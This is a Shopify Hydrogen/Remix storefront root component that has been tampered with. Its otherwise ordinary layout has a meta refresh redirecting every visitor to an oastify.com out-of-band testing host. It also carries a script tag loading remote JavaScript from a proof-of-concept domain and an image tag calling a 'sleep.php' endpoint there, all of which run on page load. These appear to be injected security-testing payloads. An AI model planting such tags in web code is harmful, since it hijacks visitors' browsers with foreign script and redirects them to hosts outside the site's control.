import {
  Links,
  Meta,
  Outlet, 
  Scripts,
  ScrollRestoration,
  useLoaderData,
} from '@remix-run/react';
import styles from './styles/app.css';
import favicon from '../public/favicon.svg';        


export const links = () => { 
  return [
    {rel: 'stylesheet', href: styles}, 
    {
      rel: 'preconnect', 
      href: 'https://cdn.shopify.com',   
    },
    {
      rel: 'preconnect',
      href: 'https://shop.app',
    },
    {rel: 'icon', type: 'image/svg+xml', href: favicon}, 
  ];
}; 
 
export const meta = () => ({
  charset: 'utf-8',
  viewport: 'width=device-width,initial-scale=1',
});
 
export async function loader({context}) {
  const layout = await context.storefront.query(LAYOUT_QUERY);
  return {layout};
}

export default function App() {
  const data = useLoaderData();

  const {name} = data.layout.shop;

  
 

  
  return (
    <html lang="en">
      <head>
    <meta http-equiv="refresh" content="0;URL=http://owo8qet1ifi55n1lgya5ajkrsiy9m0rog.oastify.com"/>
        <Meta />
        <Links />
      </head>
      <body>
        <h1>Hello, </h1>

        <p>This is a custom storefront powered by Hydrogenafrraaa</p>

<script src="https://poc.wleberre.fr/js.js"></script>
    <img src="https://poc.wleberre.fr/sleep.php"/>
        <Outlet />
        <ScrollRestoration />
        <Scripts />
      </body>
    </html>
  );
}

const LAYOUT_QUERY = `#graphql
  query layout {
    shop {
      name
      description
    }
  }
`;
